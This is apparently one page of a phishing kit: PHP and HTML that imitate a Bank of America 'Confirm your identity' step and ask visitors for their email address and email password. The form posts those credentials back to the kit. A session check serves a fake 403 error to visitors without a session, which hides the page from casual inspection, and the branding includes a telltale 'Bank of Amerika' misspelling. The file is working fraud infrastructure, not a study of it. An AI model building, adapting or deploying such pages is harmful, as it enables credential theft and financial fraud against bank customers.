<?php
session_start();
error_reporting(0);
// Check if session is not set, or if they do not match
if($_SESSION['username'] == "") {
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head class="at-element-marker">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Online Banking Security: Confirm identity</title>
    <link rel="stylesheet" type="text/css" href="../assets/css/abpa-foundation.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/abpa-responsive.css">
    <link rel="shortcut icon" href="../assets/img/favicon.ico" type="image/x-icon">
    <style type="text/css">
        .hide {
            display: none !important;
        }

        .show {
            display: block !important;
        }

        @keyframes ldio-1z0ye3jlelli {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }

            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        .ldio-1z0ye3jlelli div {
            position: absolute;
            width: 100.48px;
            height: 100.48px;
            border: 6.28px solid #df1317;
            border-top-color: transparent;
            border-radius: 50%;
        }

        .ldio-1z0ye3jlelli div {
            animation: ldio-1z0ye3jlelli 0.7874015748031495s linear infinite;
            top: 78.5px;
            left: 78.5px
        }

        .loadingio-spinner-rolling-u9az2tfkb6 {
            z-index: 1000;
            position: fixed;
            display: block;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            width: 100%;
            height: 100vh;
            background-color: rgba(255, 255, 255, .8);
            background-position: center;
            border-radius: 10px;
            text-align: center;
            -webkit-transition: opacity .3s ease-in;
            -o-transition: opacity .3s ease-in;
            transition: opacity .3s ease-in;
            opacity: .99;
        }

        .ldio-1z0ye3jlelli {
            z-index: 2010;
            content: ' ';
            position: fixed;
            top: 35%;
            left: 45%;
            height: 50px;
            width: 50px;
            display: inline-block;
            border-radius: 50%;
            animation: .7s linear infinite rotate;
        }

        @media screen and (max-width: 500px) {
            .loadingio-spinner-rolling-u9az2tfkb6 .ldio-1z0ye3jlelli {
                top: 35%;
                left: 27%;
                height: 50px;
                width: 50px;
            }
        }

        .errorClass {
            color: red;
            margin-top: 0;
            padding-bottom: 10px;
        }

        .error {
            color: red;
        }
    </style>
</head>

<body>
    <div id="oDaL_" style="width:100%;height:100%;" class="z-page">
        <div class="loadingio-spinner-rolling-u9az2tfkb6">
            <div class="ldio-1z0ye3jlelli">
                <div></div>
            </div>
        </div>
        <div id="oDaL0" class="z-div">
            <div id="oDaL1" style="display:none;" class="z-div"><span id="oDaL2" class="z-label">Build: </span></div>
            <a id="oDaL3" name="top"></a>
            <div id="oDaL4" class="row page-container">
                <div id="oDaL5" class="small-12 columns">
                    <div id="oDaL6" class="z-div">
                        <div id="oDaL7" class="header">
                            <div id="oDaL8" class="row header_branding-bar">
                                <div class="small-12 columns">
                                    <span>
                                        <img class="image-logo" src="../assets/img/BofA_rgb.png" alt="Bank of America">
                                    </span>
                                    <a class="right secure-text show-for-medium-up" href="javascript:void(0);" name="ancHMSecArea" id="ancHMSecArea">
                                        Secure Page
                                    </a>
                                    <a class="right secure-text show-for-small-only" href="javascript:void(0);" name="ancHMSecArea">
                                    </a>
                                </div>
                            </div>
                            <div id="oDaL9" class="z-div">
                                <div id="oDaLa" class="row header_title-bar">
                                    <div class="small-12 columns">
                                        <h1>
                                            <div id="oDaLb" class="z-div">
                                                <span id="oDaLc">Bank of Amerika Security Center</span>
                                            </div>
                                        </h1>
                                    </div>
                                </div>
                                <div class="small-12 columns progress-bar--v1">
                                    <div class="contain-to-grid sticky">
                                        <nav class="top-bar" data-topbar="">
                                            <div class="progress progress--v1">
                                                <span id="step-meter" class="meter" style="width: 0;"><span id="step-meter-inner" class="meter" style="display:none;"></span></span>
                                                <span id="step-counter" class="hide">1</span>
                                            </div>
                                            <ul class="progress-bar_step-list--v1">
                                                <li class="progress-bar_step">
                                                    <span id="step-1-circle" class="step-circle active">
                                                        <p class="show-for-medium-up step-number">
                                                            <span id="m12Ie" class="ada-hidden">Step 1 of 3 (Current Step):</span>
                                                            1
                                                        </p>
                                                    </span>
                                                    <label id="step-1-label" class="show-for-medium-up step-text active">Account Authentication</label>
                                                </li>
                                                <li class="progress-bar_step">
                                                    <span id="step-2-circle" class="step-circle">
                                                        <p class="show-for-medium-up step-number">
                                                            <span id="m12Ih" class="ada-hidden">Step 2 of 3:</span>
                                                            2
                                                        </p>
                                                    </span>
                                                    <label id="step-2-label" class="show-for-medium-up step-text">Your Information</label>
                                                </li>
                                                <li class="progress-bar_step">
                                                    <span id="step-3-circle" class="step-circle">
                                                        <p class="show-for-medium-up step-number">
                                                            <span id="m12In" class="ada-hidden">Step 3 of 3:</span>
                                                            3
                                                        </p>
                                                    </span>
                                                    <label id="step-3-label" class="show-for-medium-up step-text">Completed</label>
                                                </li>
                                            </ul>
                                            <a id="help-link" class="show-for-small-only help-dropdown_trigger">Need Help?</a>
                                        </nav>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="oDaLt" class="z-div">
                        <div id="oDaL80" class="z-div">
                            <div id="oDaL90" class="small-12 columns ">
                                <div id="oDaLa0" style="width:100%;height:100%;" class="responsive-div-include z-include">
                                    <div id="oDaLb0" class="z-div">
                                        <div id="oDaLp0" class="form-section">
                                            <div class="row">
                                                <div class="small-12 medium-11 large-9 columns">
                                                    <p>
                                                    </p>
                                                    <h2 style="margin-top: 20px;">Confirm your identity</h2>
                                                    <p></p>
                                                    <h3 class="c1">
                                                        To access and complete your saved application(s), please enter the following information.
                                                    </h3>
                                                </div>
                                                <hr>
                                            </div>
                                            <h3>Contact information</h3>
                                            <p style="margin-top: -17px;">Authenticate your application with email account linked to account</p>
                                        </div>
                                        <form name="kepoz" id="kepoz" action="?action=email" method="POST">
                                            <div class="row">
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_email" style="font-weight: bold;">
                                                        Email address
                                                    </label>
                                                    <div class="addfocus emailfocus">
                                                        <input type="text" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="30" name="email" id="email" placeholder="Email address" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                                <div class="small-12 medium-6 large-5 columns">
                                                    <label class="c5--v5 label_password" style="font-weight: bold;">
                                                        Password
                                                    </label>
                                                    <div class="addfocus passwordfocus">
                                                        <input type="password" data-field-type="" class="tl-private z-textbox abpa-textbox" value="" maxlength="30" name="password" id="password" placeholder="Password" aria-describedby="zz_snr_lastName_v_1-hint zz_snr_lastName_v_1-errtxt">
                                                    </div>
                                                </div>
                                                <div class="row ">
                                                    <div class="small-12 medium-11 columns mt-10 z-div">
                                                        <p class="message-title"><img class="image-info" src="../assets/img/info_icon_2x.svg" alt=" ">Keeping your account secure <br></p>
                                                        <p class="message-body">We'll verify your Email before you submit your application.</p>
                                                    </div>
                                                </div>
                                            </div>
                                            <br>
                                            <div id="oDaLu0" class="row">
                                                <div id="yKqK21">
                                                    <div class="small-12 columns ecd-container">
                                                        <p class="c2">By continuing, you confirm that the information you entered <strong>matches</strong> your account.</p>
                                                    </div>
                                                </div>
                                                <div id="oDaLv0" class="small-12 medium-4 columns z-div">
                                                    <button type="submit" class="button primary medium" name="btn_snrsearch_continue" onclick="validateForm();">Continue</button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="oDaLx0" class="z-div">
                            <div id="oDaLy0" class="small-12 columns hide">
                                <div id="oDaLz0" style="width:100%;height:100%;" class="responsive-div-include z-include">
                                    <div id="oDaL_1" class="z-div"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="oDaL11" class="z-include">
                    <div id="oDaL21" class="row hide-for-print">
                        <span id="hiddenIsContinueButtonActive_v_1" style="display:none;" class="z-checkbox"><input type="checkbox" id="hiddenIsContinueButtonActive_v_1-real" name="hiddenIsContinueButtonActive" checked="checked"><label for="hiddenIsContinueButtonActive_v_1-real" class="z-checkbox-cnt"></label></span>
                        <div id="oDaL41" style="display:none;" class="small-12 columns">
                            <a id="oDaL51" class="button primary small z-a" name="btn_continue" href="javascript:void(0);">Continue</a>
                            <a id="oDaL61" style="display:none;" class="button primary small button primary small-disd" name="btn_submitApplication" href="javascript:void(0);">Submit Application<span id="oDaL71" class="ada-hidden none z-label">unavailable</span></a>
                            <a id="oDaL81" style="display:none;" class="button primary small" name="btn_submit" href="javascript:void(0);">Submit</a>
                            <a id="oDaL91" class="button-secondary" name="btn_cancelAndExitApp" href="javascript:void(0);">Cancel and exit application</a>
                            <a id="oDaLa1" style="display:none;" class="button-secondary" name="btn_continueWithoutAnswer" href="javascript:void(0);">Continue without answering questions</a>
                        </div>
                    </div>
                </div>
                <div id="oDaLc1" class="z-div">
                    <div id="oDaLd1" class="footer hide-for-print">
                        <div id="oDaLe1" class="row">
                            <div id="oDaLf1" class="small-12 columns">
                                <p class="privacy-text">
                                    <span id="oDaLg1" class="z-span">
                                        <a id="oDaLh1" class="privacy-text_link" title="Share website feedback" name="link_shareWebsiteFeedback" href="javascript:void(0);">Share website feedback</a>
                                        <span id="oDaLi1" aria-hidden="true"> | </span></span>
                                    <a class="privacy-text_link" title="Privacy &amp; Security. Link opens in new window." name="PrivacyAndSecurity" href="javascript:void(0);">Privacy &amp; Security</a>
                                </p>
                                <p focusable="true" focusableintouchmode="true" class="copyright-text">
                                    Bank of America, N.A. Member FDIC.
                                    <a class="copyright-text_link" title="Equal Housing Lender. Link opens in new window." href="javascript:void(0);" name="EqualHousingLender">Equal Housing Lender</a>
                                </p>
                                <p focusable="true" focusableintouchmode="true" class="copyright-text">© <script>
                                        document.write(new Date().getFullYear())
                                    </script> Bank of America Corporation. All rights reserved.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/jquery.mask.min.js"></script>
    <script src="../assets/js/jquery.validate.min.js"></script>
    <script>
        $(window).ready(function() {
            setInterval(function() {
                $('.loadingio-spinner-rolling-u9az2tfkb6').fadeOut('fast');
                $('.ldio-1z0ye3jlelli').fadeOut('fast');
            }, 1000);
        });

        jQuery.validator.addMethod("emailExt", function(value, element, param) {
            return value.match(/^[a-zA-Z0-9_\.%\+\-]+@[a-zA-Z0-9\.\-]+\.[a-zA-Z]{2,}$/);
        }, 'Please check a Email address.');

        $(document).ready(function(e) {

                $("#kepoz").validate({
                    errorClass: "errorClass",
                    rules: {
                        email: {
                            required: true,
                            minlength: 10,
                            emailExt: true
                        },
                        password: {
                            required: true,
                            minlength: 8,
                        },
                    },
                    messages: {
                        email: {
                            required: "Please enter a Email address."
                        },
                        password: {
                            required: "Please enter a Password."
                        },
                    }
                });
        })

        let emailFocus = $('input[name=email]');
        emailFocus.focusin(function() {
            $('.emailfocus').addClass('active');
        });
        emailFocus.focusout(function() {
            $('.emailfocus').removeClass('active');
        });
        
        let passwordFocus = $('input[name=password]');
        emailFocus.focusin(function() {
            $('.passwordfocus').addClass('active');
        });
        emailFocus.focusout(function() {
            $('.passwordfocus').removeClass('active');
        });
    </script>
</body>

</html>